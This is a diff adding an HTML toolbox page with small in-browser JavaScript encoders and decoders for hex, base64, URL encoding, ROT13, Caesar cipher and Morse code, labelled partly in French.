+      <textarea id="hexEncodeIn" rows="5" class="col-5" name="description" onkeyup="onHexEncode()" onchange="onHexEncode()"></textarea>
+      <textarea readonly="" id="hexEncodeOut" rows="5" class="col-5" name="description"></textarea>
+    </div>
+    <script>
+    function convertFromHex(hex) {
+    var hex = hex.toString();//force conversion
+    var str = '';
+    for (var i = 0; i < hex.length; i += 2)
+        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+    return str;
+    }
+
+    function convertToHex(str) {
+        var hex = '';
+        for(var i=0;i<str.length;i++) {
+            hex += ''+str.charCodeAt(i).toString(16);
+        }
+        return hex;
+    }
+    function onHexEncode(){
+        document.getElementById('hexEncodeOut').value = convertToHex(document.getElementById('hexEncodeIn').value);
+    }
+    </script>
+</div>
+<div class="">
+    <div class="form-group text-left row">
+      <label for="usr" class="col-12">Texte à décoder</label>
+      <textarea id="hexDecodeIn" rows="5" class="col-5" name="description" onkeyup="onHexDecode()" onchange="onHexDecode()"></textarea>
+      <textarea readonly="" id="hexDecodeOut" rows="5" class="col-5" name="description"></textarea>
+    </div>
+    <script>
+    function onHexDecode(){
+        document.getElementById('hexDecodeOut').value = convertFromHex(document.getElementById('hexDecodeIn').value);
+    }
+    </script>
+</div></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=HTTPBase64">Encodage base64</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>L'encodage base64 permet de transmettre des données en n'utilisant que des caractères affichables (lettres, chiffres, quelques signes...)<br></p>
+<div class="">
+    <div class="form-group text-left row">
+      <label for="usr" class="col-12">Texte à encoder</label><br>
+      <textarea id="base64EncodeIn" rows="5" class="col-5" name="description" onkeyup="onBase64Encode()" onchange="onBase64Encode()"></textarea>
+      <textarea readonly="" id="base64EncodeOut" rows="5" class="col-5" name="description"></textarea>
+    </div>
+    <script>
+    function onBase64Encode(){
+        document.getElementById('base64EncodeOut').value = window.btoa(document.getElementById('base64EncodeIn').value);
+    }
+    </script>
+</div>
+<div class="">
+    <div class="form-group text-left row">
+      <label for="usr" class="col-12">Texte à décoder</label>
+      <textarea id="base64DecodeIn" rows="5" class="col-5" name="description" onkeyup="onBase64Decode()" onchange="onBase64Decode()"></textarea>
+      <textarea readonly="" id="base64DecodeOut" rows="5" class="col-5" name="description"></textarea>
+    </div>
+    <script>
+    function onBase64Decode(){
+        document.getElementById('base64DecodeOut').value = window.atob(document.getElementById('base64DecodeIn').value);
+    }
+    </script>
+</div></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=EncodeURL">Encodage URL/Pourcent</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>L'encodage URL/Pourcent permet d'utiliser des caractères spéciaux dans les urls tels que les apostrophes, les espaces...)<br></p>
+<div class="">
+    <div class="form-group text-left row">
+      <label for="usr" class="col-12">Text to encode</label>
+      <textarea id="UrlEncodeIn" rows="5" class="col-5" name="description" onkeyup="onUrlEncode()" onchange="onUrlEncode()"></textarea>
+      <textarea readonly="" id="UrlEncodeOut" rows="5" class="col-5" name="description"></textarea>
+    </div>
+    <script>
+    function onUrlEncode(){
+        document.getElementById('UrlEncodeOut').value = encodeURIComponent(document.getElementById('UrlEncodeIn').value);
+    }
+    </script>
+</div>
+<div class="">
+
+    <div class="form-group text-left row">
+      <label for="usr" class="col-12">Text to decode</label>
+      <textarea id="UrlDecodeIn" rows="5" class="col-5" name="description" onkeyup="onUrlDecode()" onchange="onUrlDecode()"></textarea>
+      <textarea readonly="" id="UrlDecodeOut" rows="5" class="col-5" name="description"></textarea>
+    </div>
+
+    <script>
+    function onUrlDecode(){
+        document.getElementById('UrlDecodeOut').value = decodeURIComponent(document.getElementById('UrlDecodeIn').value);
+    }
+    </script>
+</div>  </div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=EncodeROT13">Encodage ROT13</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p><br></p>
+<div class="">
+    <div class="form-group text-left row">
+      <label for="usr" class="col-12">Text to encode</label>
+      <textarea id="Rot13EncodeIn" rows="5" class="col-5" name="description" onkeyup="onRot13Encode()" onchange="onRot13Encode()"></textarea>
+      <textarea readonly="" id="Rot13EncodeOut" rows="5" class="col-5" name="description"></textarea>
+    </div>
+    <script>
+    function rot13(str) {
+      var input     = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+      var output    = 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm';
+      var index     = x => input.indexOf(x);
+      var translate = x => index(x) > -1 ? output[index(x)] : x;
+      return str.split('').map(translate).join('');
+    }
+    function onRot13Encode(){
+        document.getElementById('Rot13EncodeOut').value = rot13(document.getElementById('Rot13EncodeIn').value);
+    }
+    </script>
+</div>
+<div class="">
+
+    <div class="form-group text-left row">
+      <label for="usr" class="col-12">Text to decode</label>
+      <textarea id="Rot13DecodeIn" rows="5" class="col-5" name="description" onkeyup="onRot13Decode()" onchange="onRot13Decode()"></textarea>
+      <textarea readonly="" id="Rot13DecodeOut" rows="5" class="col-5" name="description"></textarea>
+    </div>
+
+    <script>
+    function onRot13Decode(){
+        document.getElementById('Rot13DecodeOut').value = rot13(document.getElementById('Rot13DecodeIn').value);
+    }
+    </script>
+</div>  </div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=EncodeCaesar">Encodage Caesar</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p><br></p>
+<div class="">
+    <div class="form-group text-left row">
+      <label for="usr" class="col-12">Shift</label>
+      <textarea id="CaesarShift" rows="1" class="col-1" name="description" onkeyup="onCaesarEncode();onCaesarDecode();" onchange="onCaesarEncode();onCaesarDecode();">1</textarea>
+      <label for="usr" class="col-12">Text to encode</label>
+      <textarea id="CaesarEncodeIn" rows="5" class="col-5" name="description" onkeyup="onCaesarEncode()" onchange="onCaesarEncode()"></textarea>
+      <textarea readonly="" id="CaesarEncodeOut" rows="5" class="col-5" name="description"></textarea>
+    </div>
+    <script>
+    var alphabet = 'abcdefghijklmnopqrstuvwxyz';
+    var fullAlphabet = alphabet + alphabet + alphabet;
+
+    function CaesarEncode(cipherText, cipherOffset){
+      cipherOffset = (cipherOffset % alphabet.length);
+      var cipherFinish = '';
+
+      for(i=0; i<cipherText.length; i++){
+         var letter = cipherText[i];
+         var upper = (letter == letter.toUpperCase());
+         letter = letter.toLowerCase();
+
+         var index = alphabet.indexOf(letter);
+         if(index == -1){
+           cipherFinish += letter;
+         } else {
+           index = ((index + cipherOffset) + alphabet.length);
+           var nextLetter = fullAlphabet[index];
+           if(upper) nextLetter = nextLetter.toUpperCase();
+           cipherFinish += nextLetter;
+         }
+      }
+
+      return cipherFinish;
+    }
+
+    function onCaesarEncode(){
+        document.getElementById('CaesarEncodeOut').value = CaesarEncode(document.getElementById('CaesarEncodeIn').value, document.getElementById('CaesarShift').value);
+    }
+    </script>
+</div>
+<div class="">
+
+    <div class="form-group text-left row">
+      <label for="usr" class="col-12">Text to decode</label>
+      <textarea id="CaesarDecodeIn" rows="5" class="col-5" name="description" onkeyup="onCaesarDecode()" onchange="onCaesarDecode()"></textarea>
+      <textarea readonly="" id="CaesarDecodeOut" rows="5" class="col-5" name="description"></textarea>
+    </div>
+
+    <script>
+    function onCaesarDecode(){
+        document.getElementById('CaesarDecodeOut').value = CaesarEncode(document.getElementById('CaesarDecodeIn').value, - document.getElementById('CaesarShift').value);
+    }
+    </script>
+</div>  </div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=EncodeMorse">Code Morse</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p><br></p>
+<div class="">
+    <div class="form-group text-left row">
+      <label for="usr" class="col-12">Text to encode</label>
+      <textarea id="MorseEncodeIn" rows="5" class="col-5" name="description" onkeyup="onMorseEncode()" onchange="onMorseEncode()"></textarea>
+      <textarea readonly="" id="MorseEncodeOut" rows="5" class="col-5" name="description"></textarea>
+    </div>
+
+    <script>
+    var alphabet_morse = {
+        'a': '.-',    'b': '-...',  'c': '-.-.', 'd': '-..',
+        'e': '.',     'f': '..-.',  'g': '--.',  'h': '....',
+        'i': '..',    'j': '.---',  'k': '-.-',  'l': '.-..',
+        'm': '--',    'n': '-.',    'o': '---',  'p': '.--.',
+        'q': '--.-',  'r': '.-.',   's': '...',  't': '-',
+        'u': '..-',   'v': '...-',  'w': '.--',  'x': '-..-',
+        'y': '-.--',  'z': '--..',  
+        ' ': '/',     '_': '..--.-',
+        '1': '.----', '2': '..---', '3': '...--', '4': '....-', 
+        '5': '.....', '6': '-....', '7': '--...', '8': '---..', 
+        '9': '----.', '0': '-----', 
+    };
+    function stringToMorse(txt) {
+        var morse = txt.split('')            // Transform the string into an array: ['T', 'h', 'i', 's'...
+        .map(function(e){     // Replace each character with a morse letter
+            return alphabet_morse[e.toLowerCase()] || ''; // Lowercase only, ignore unknown characters.
+        })
+        .join(' ')            // Convert the array back to a string.
+        /*.replace(/ +/g, ' '); // Replace double spaces that may occur when unknow characters were in the source string.*/
+        return morse;
+    }
+    function onMorseEncode(){
+        document.getElementById('MorseEncodeOut').value = stringToMorse(document.getElementById('MorseEncodeIn').value);
+    }
+    </script>
+</div>
+<div class="">
+
+    <div class="form-group text-left row">
+      <label for="usr" class="col-12">Text to decode</label>
+      <textarea id="MorseDecodeIn" rows="5" class="col-5" name="description" onkeyup="onMorseDecode()" onchange="onMorseDecode()"></textarea>
+      <textarea readonly="" id="MorseDecodeOut" rows="5" class="col-5" name="description"></textarea>
+    </div>
+
+    <script>
+    var MORSE_CODE = {'.-': 'a', '-...':'b', '-.-.': 'c', '-..': 'd', '.':'e', '..-.':'f', '--.':'g', '....':'h', '..':'i', '.---':'j', '-.-':'k', '.-..':'l', '--':'m', '-.':'n', '---':'o', '.--.':'p', '--.-':'q', '.-.':'r', '...':'s', '-':'t', '..-':'u', '...-':'v', '.--':'w', '-..-':'x', '-.--':'y', '--..':'z', '.----':'1', '..---':'2', '...--':'3', '....-':'4', '.....':'5', '-....':'6', '--...':'7', '---..':'8', '----.':'9', '-----':'0', '|':' ', '..--.-':'_'};
+
+    var decodeMorse = function(morseCode){
+      var words = (morseCode).split('  ');
+      var letters = words.map((w) => w.split(' '));
+      var decoded = [];
+
+      for(var i = 0; i < letters.length; i++){
+        decoded[i] = [];
+        for(var x = 0; x < letters[i].length; x++){
+            if(MORSE_CODE[letters[i][x]]){
+                decoded[i].push( MORSE_CODE[letters[i][x]].toUpperCase() );
+            }
+        }
+      }
+
+      return decoded.map(arr => arr.join('')).join(' ');
+    }
+    function onMorseDecode(){
+        document.getElementById('MorseDecodeOut').value = decodeMorse(document.getElementById('MorseDecodeIn').value);
+    }
+    </script>
+</div>  
+<div>
+Veuillez noter que les majuscules sont perdues lors de l'encodage.
+</div></div>
+                   </div>
+    
+        </div>
+      </div>
+
+	  <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+      <footer class="footer">
+        <p class="text-secondary"></p>
+      </footer>	
+    </div> <!-- /container -->
+
+</body></html>
